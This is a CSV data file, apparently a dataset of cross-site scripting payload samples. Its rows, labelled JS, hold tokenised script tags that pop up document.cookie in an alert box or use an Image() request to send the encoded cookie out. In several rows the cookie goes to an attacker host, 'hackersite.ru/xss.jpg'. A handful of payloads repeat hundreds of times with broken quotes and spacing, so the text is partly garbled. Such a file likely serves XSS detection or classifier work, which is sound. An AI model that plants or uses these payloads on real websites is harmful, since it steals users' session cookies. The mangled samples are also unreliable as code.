,language,source
1368,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1369,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1370,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1371,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1372,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1373,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1374,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1375,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1376,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1377,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1378,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1379,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1380,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1381,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1382,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1383,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1384,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1385,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1386,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1387,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1388,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1389,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1390,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1391,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1392,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1393,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1394,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1395,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1396,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1397,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1398,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1399,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1400,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1401,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1402,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1403,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1404,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1405,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1406,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1407,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1408,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1409,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1410,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1411,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1412,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1413,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1414,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1415,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1416,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1417,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1418,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1419,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1420,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1421,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1422,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1423,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1424,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1425,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1426,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1427,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1428,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1429,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1430,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1431,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1432,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1433,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1434,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1435,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1436,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1437,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1438,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1439,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1440,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1441,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1442,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1443,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1444,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1445,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1446,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1447,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1448,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1449,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1450,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1451,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1452,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1453,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1454,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1455,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1456,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1457,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1458,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1459,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1460,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1461,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1462,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1463,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1464,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1465,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1466,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1467,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1468,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1469,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1470,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1471,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1472,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1473,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1474,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1475,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1476,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1477,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1478,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1479,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1480,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1481,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1482,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1483,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1484,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1485,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1486,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1487,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1488,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1489,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1490,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1491,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1492,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1493,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1494,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1495,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1496,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1497,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1498,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1499,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1500,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1501,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1502,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1503,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1504,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1505,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1506,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1507,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1508,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1509,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1510,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1511,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1512,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1513,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1514,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1515,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1516,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1517,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1518,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1519,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1520,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1521,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1522,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1523,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1524,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1525,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1526,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1527,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1528,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1529,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1530,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1531,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1532,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1533,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1534,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1535,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1536,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1537,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1538,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1539,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1540,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1541,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1542,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1543,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1544,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1545,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1546,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1547,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1548,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1549,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1550,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1551,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1552,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1553,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1554,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1555,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1556,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1557,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1558,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1559,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1560,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1561,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1562,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1563,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1564,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1565,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1566,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1567,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1568,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1569,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1570,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1571,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1572,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1573,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1574,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1575,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1576,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1577,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1578,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1579,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1580,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1581,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1582,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1583,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1584,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1585,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1586,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1587,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1588,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1589,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1590,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1591,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1592,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1593,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1594,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1595,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1596,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1597,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1598,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1599,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1600,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1601,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1602,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1603,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1604,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1605,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1606,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1607,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1608,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1609,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1610,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1611,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1612,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1613,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1614,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1615,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1616,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1617,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1618,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1619,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1620,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1621,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1622,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1623,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1624,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1625,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1626,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1627,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1628,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1629,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1630,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1631,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1632,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1633,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1634,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1635,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1636,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1637,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1638,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1639,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1640,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1641,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1642,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1643,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1644,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1645,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1646,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1647,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1648,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1649,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1650,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1651,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1652,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1653,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1654,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1655,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1656,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1657,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1658,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1659,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1660,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1661,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1662,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1663,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1664,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1665,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1666,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1667,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1668,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1669,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1670,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1671,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1672,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1673,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1674,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1675,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1676,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1677,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1678,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1679,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1680,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1681,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1682,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1683,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1684,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1685,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1686,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1687,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1688,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1689,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
